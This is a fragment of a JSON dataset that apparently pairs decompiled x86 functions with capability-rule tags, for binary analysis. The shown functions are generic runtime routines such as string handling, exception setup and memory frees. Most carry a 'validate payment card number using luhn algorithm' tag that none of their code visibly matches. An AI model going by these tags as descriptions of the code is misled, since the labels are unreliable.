        "decompiled_code": "\nvoid __cdecl\nfcn.00418ae0(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e350;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    var_20h = in_ECX;\n    fcn.00402dd3(noname_0 + 4, in_ECX + 1);\n    *var_20h = vtable.std::runtime_error.0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 286
    },
    "00404098": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404098(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0x10));\n    fcn.004040d9(*(param_1 + 0x14));\n    return;\n}\n",
        "token_count": 74
    },
    "004040fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040fc(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00491b6a(2, \"FlsGetValue\", 0x54fb34, 0x54fb3c);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsGetValue)(arg_8h);\n    }\n    else {\n        (**0x573000)();\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00404133": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404133(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    uint *in_ECX;\n    uint var_4h;\n    \n    uVar1 = in_ECX[4];\n    if (arg_8h <= uVar1) {\n        if (in_ECX[5] - uVar1 < arg_ch) {\n            fcn.00404a2a(arg_ch, in_ECX, arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            in_ECX[4] = uVar1 + arg_ch;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            arg_8h_00 = in_ECX + arg_8h * 2;\n            fcn.004058f3(arg_8h_00 + arg_ch * 2, arg_8h_00, (uVar1 - arg_8h) * 2 + 2);\n            fcn.00404c50(arg_8h_00, arg_10h, arg_ch);\n        }\n        return;\n    }\n    fcn.004026e4();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 311
    },
    "004041c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004041c9(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.004060eb(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        fcn.00403d5f(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x18);\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 275
    },
    "00404200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404200(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.0040355d(arg_8h, arg_ch, 0x7ffffffe);\n        iVar3 = fcn.004043b8(iVar2 + 1);\n        in_ECX[5] = iVar2;\n        in_ECX[4] = arg_8h;\n        fcn.0040576d(iVar3, arg_10h, arg_8h * 2);\n        *(arg_8h * 2 + iVar3) = 0;\n        if (7 < arg_ch) {\n            fcn.00401659(*in_ECX, arg_ch * 2 + 2);\n        }\n        *in_ECX = iVar3;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 292
    },
    "0040421e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040421e(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    uint CodePage;\n    uint *puVar2;\n    \n    arg_ch = arg_ch - arg_8h;\n    arg_14h = arg_14h - arg_10h;\n    if (arg_18h == NULL) {\n        iVar1 = fcn.0040379c();\n        iVar1 = *(iVar1 + 4);\n        CodePage = fcn.0040550b();\n    }\n    else {\n        iVar1 = arg_18h[1];\n        CodePage = *arg_18h;\n    }\n    if (iVar1 == 0) {\n        iVar1 = arg_ch;\n        if (arg_14h <= arg_ch) {\n            iVar1 = arg_14h;\n        }\n        iVar1 = fcn.0040209f(arg_8h, arg_10h, iVar1);\n        if ((iVar1 == 0) && (arg_ch != arg_14h)) {\n            iVar1 = (arg_14h <= arg_ch) * 2 + -1;\n        }\n    }\n    else {\n        iVar1 = fcn.00403e6d(iVar1, 0x1000, arg_8h, arg_ch, arg_10h, arg_14h, CodePage);\n        if (iVar1 == 0) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            iVar1 = 0x7fffffff;\n        }\n        else {\n            iVar1 = iVar1 + -2;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 396
    },
    "00404228": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404228(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    uVar1 = 0;\n    uVar2 = uVar3;\n    if (uVar2 != 0xffff) {\n        if ((*(arg_ch + 0xc) == 0) && (uVar2 < 0x100)) {\n            uVar1 = uVar3 - 0x61;\n            if (uVar1 < 0x1a) {\n                uVar3 = uVar2 - 0x20;\n            }\n        }\n        else {\n            var_4h = uVar3;\n            uVar1 = fcn.004045b1(*(arg_ch + 0xc), 0x200, &arg_8h, 1, &var_4h, 1);\n            uVar3 = arg_8h & 0xffff;\n            if (uVar1 != 0) {\n                uVar3 = var_4h & 0xffff;\n            }\n        }\n    }\n    return uVar1 & 0xffff0000 | uVar3;\n}\n",
        "token_count": 295
    },
    "0040424b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040424b(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *in_ECX;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    uVar1 = in_ECX[4] - arg_8h;\n    if (arg_ch <= uVar1) {\n        uVar1 = arg_ch;\n    }\n    puVar2 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        puVar2 = *in_ECX;\n    }\n    iVar3 = in_ECX[4] - uVar1;\n    in_ECX[4] = iVar3;\n    fcn.004058f3(puVar2 + arg_8h, uVar1 + puVar2 + arg_8h, (iVar3 - arg_8h) + 1);\n    return;\n}\n",
        "token_count": 202
    },
    "004042f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004042f0(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x80000000) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.0040566e(arg_8h, arg_ch, 0x7fffffff);\n        iVar3 = fcn.00406000(iVar2 + 1);\n        in_ECX[4] = arg_8h;\n        in_ECX[5] = iVar2;\n        fcn.0040314d(iVar3, arg_10h, arg_8h);\n        *(iVar3 + arg_8h) = 0;\n        if (0xf < arg_ch) {\n            fcn.00401659(*in_ECX, arg_ch + 1);\n        }\n        *in_ECX = iVar3;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 284
    },
    "00404381": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404381(void)\n\n{\n    fcn.004a8901(0, 2, 1);\n    return;\n}\n",
        "token_count": 32
    },
    "004043a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043a9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    fcn.004054e8(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, 0);\n    return;\n}\n",
        "token_count": 89
    },
    "004043b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004043b3(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0x10));\n    fcn.004040d9(*(param_1 + 0x14));\n    fcn.004040d9(*(param_1 + 0x18));\n    return;\n}\n",
        "token_count": 93
    },
    "004043b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043b8(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    \n    if (arg_8h < 0x80000000) {\n        fcn.00406000(arg_8h * 2);\n        return;\n    }\n    fcn.004050bf();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 92
    },
    "00404453": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404453(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00404b3d(*arg_8h);\n    fcn.00402973(arg_8h[1]);\n    var_8h = 0;\n    var_4h = 0;\n    iVar1 = fcn.004030c6(&var_8h);\n    if (((iVar1 == 0) && (*arg_8h == var_8h)) && (arg_8h[1] == var_4h)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 183
    },
    "0040449e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040449e(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_14h - arg_10h >> 1;\n    if (iVar1 <= arg_ch - arg_8h >> 1) {\n        fcn.0040576d(arg_8h, arg_10h, iVar1 * 2);\n    }\n    return iVar1;\n}\n",
        "token_count": 119
    },
    "004044df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004044df(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.0040355d(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.004043b8(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00403d96(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00403d96(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h);\n            fcn.00401659(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 422
    },
    "00404502": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.00404502(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = 0;\n    iVar1 = 0;\n    do {\n        if (*(iVar1 * 8 + 0x552378) == arg_ch) {\n            var_1ch = *(iVar1 * 8 + 0x55237c);\n            break;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x1d);\n    if (var_1ch == 0) {\n        fcn.004051a0(arg_28h, 0xffff);\n        fcn.00403cec(arg_8h);\n        return CONCAT44(arg_24h, arg_20h);\n    }\n    var_18h = arg_10h;\n    var_14h = arg_14h;\n    var_10h = arg_18h;\n    var_ch = arg_1ch;\n    var_8h = arg_20h;\n    var_20h = arg_8h;\n    var_4h = arg_24h;\n    fcn.004051a0(arg_28h, 0xffff);\n    iVar1 = fcn.00402fae(&var_20h);\n    if (iVar1 == 0) {\n        fcn.00403cec(arg_8h);\n    }\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 424
    },
    "00404525": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl\nfcn.00404525(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e2b0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    var_20h = in_ECX;\n    fcn.00402dd3(noname_0 + 4, in_ECX + 1);\n    *in_FS_OFFSET = var_18h;\n    return var_20h;\n}\n",
        "token_count": 276
    },
    "00404552": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404552(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004d1c46(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 64
    },
    "0047a3d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047a3d4(uint16_t *arg_8h, uint16_t *arg_ch, uint arg_10h, uchar *arg_14h)\n\n{\n    uchar uVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00404b06(*arg_8h, arg_10h);\n            *arg_14h = uVar1;\n            arg_8h = arg_8h + 1;\n            arg_14h = arg_14h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 152
    },
    "00404570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404570(uint16_t *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint16_t *arg_14h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    \n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 1) {\n        if (arg_10h == arg_14h) goto code_r0x004684f1;\n        uVar1 = *arg_8h;\n        uVar2 = *arg_10h;\n        if (uVar1 < uVar2) {\n            return 0xffffffff;\n        }\n        if (uVar1 >= uVar2 && uVar1 != uVar2) {\n            return 1;\n        }\n        arg_10h = arg_10h + 1;\n    }\n    if (arg_10h == arg_14h) {\ncode_r0x004684f1:\n        uVar3 = arg_8h != arg_ch;\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 264
    },
    "004045cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004045cf(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint *in_ECX;\n    uint *puVar1;\n    uint var_4h;\n    \n    if (arg_ch < in_ECX[5] || arg_ch == in_ECX[5]) {\n        puVar1 = in_ECX;\n        if (7 < in_ECX[5]) {\n            puVar1 = *in_ECX;\n        }\n        in_ECX[4] = arg_ch;\n        fcn.004058f3(puVar1, arg_8h, arg_ch * 2);\n        *(arg_ch * 2 + puVar1) = 0;\n    }\n    else {\n        fcn.00405c9a(arg_ch, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 184
    },
    "0040461f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040461f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004aeb89(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 64
    },
    "00404629": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404629(uint lpCriticalSection, uint dwSpinCount, uint arg_10h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00491b6a(4, \"InitializeCriticalSectionEx\", 0x54fb6c, 0x54fb74);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(lpCriticalSection, dwSpinCount);\n    }\n    else {\n        (**0x573000)(lpCriticalSection, dwSpinCount, arg_10h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "0040465b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040465b(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    int32_t iStack24;\n    uint uStack20;\n    \n    piStack32 = &iStack36;\n    uStack20 = 0xffffffff;\n    iStack24 = 0x41e400;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    fcn.004060f5(0);\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x24) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x2c) = 0;\n    *(param_1 + 0x30) = 0;\n    iStack36 = param_1;\n    if (param_2 != 0) {\n        uStack20 = 0;\n        fcn.004060ff(param_1, param_2);\n        *in_FS_OFFSET = piStack28;\n        return iStack36;\n    }\n    uStack20 = 0;\n    fcn.0040255e(0x541a18);\n    iVar1 = iStack24;\n    if (*(iStack24 + 0x2c) != 0) {\n        fcn.004040d9(*(iStack24 + 0x2c));\n    }\n    *(iVar1 + 0x2c) = 0;\n    if (*(iVar1 + 0x24) != 0) {\n        fcn.004040d9(*(iVar1 + 0x24));\n    }\n    *(iVar1 + 0x24) = 0;\n    if (*(iVar1 + 0x1c) != 0) {\n        fcn.004040d9(*(iVar1 + 0x1c));\n    }\n    *(iVar1 + 0x1c) = 0;\n    if (*(iVar1 + 0x14) != 0) {\n        fcn.004040d9(*(iVar1 + 0x14));\n    }\n    *(iVar1 + 0x14) = 0;\n    if (*(iVar1 + 0xc) != 0) {\n        fcn.004040d9(*(iVar1 + 0xc));\n    }\n    *(iVar1 + 0xc) = 0;\n    if (*(iVar1 + 4) != 0) {\n        fcn.004040d9(*(iVar1 + 4));\n    }\n    *(iVar1 + 4) = 0;\n    iVar1 = fcn.00403684();\n    return iVar1;\n}\n",
        "token_count": 728
    },
    "00404692": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00404692(int32_t param_1)\n\n{\n    *(param_1 + 0x3c) = 1;\n    fcn.004016ae(*(param_1 + 0x32), param_1 + 0x18);\n    return 1;\n}\n",
        "token_count": 66
    },
    "0047b5be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.0047b5be(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar1 = fcn.00406843(in_ECX, &var_ch, 0x54d9f4, *(arg_14h + 0x14));\n    uVar1 = fcn.004054ed(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.004030df(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.00403085(var_4ch);\n    return;\n}\n",
        "token_count": 248
    },
    "0040477d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040477d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        fcn.004040d9(*(iVar1 + 8));\n        fcn.004040d9(*(iVar1 + 0x10));\n        fcn.004040d9(*(iVar1 + 0x14));\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "0048179b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048179b(int32_t arg_8h, int32_t arg_ch)\n\n{\n    fcn.004028b0(0x811c9dc5, arg_8h, arg_ch - arg_8h);\n    return;\n}\n",
        "token_count": 60
    },
    "0047b302": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.0047b302(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar1 = fcn.00404d4f(in_ECX, &var_ch, 0x54d9e8, *(arg_14h + 0x14));\n    uVar1 = fcn.004054ed(&var_4ch, 0x40, uVar1, arg_1ch, arg_20h);\n    fcn.00406041(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.00403085(var_4ch);\n    return;\n}\n",
        "token_count": 260
    },
    "0040488b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040488b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.004060eb(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 204
    },
    "00404895": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404895(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        if (arg_8h == *(uVar1 * 8 + 0x551380)) {\n            return *(uVar1 * 8 + 0x551384);\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x2d);\n    if (arg_8h - 0x13U < 0x12) {\n        return 0xd;\n    }\n    return (-(0xe < arg_8h - 0xbcU) & 0xe) + 8;\n}\n",
        "token_count": 163
    },
    "004048e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004048e5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00405119(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004061d1(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "00491568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00491568(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(param_1 + 0xc) < 0) {\n        pcVar1 = ***(param_1 + 8);\n        (**0x573000)();\n        iVar2 = (*pcVar1)();\n        pcVar1 = ***(param_1 + 4);\n        (**0x573000)();\n        iVar3 = (*pcVar1)();\n        *(param_1 + 0xc) = iVar3 + iVar2;\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0040499e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040499e(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.00401de8(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.0040376a(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00403ce7(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00403ce7(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h);\n            fcn.00401659(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 423
    },
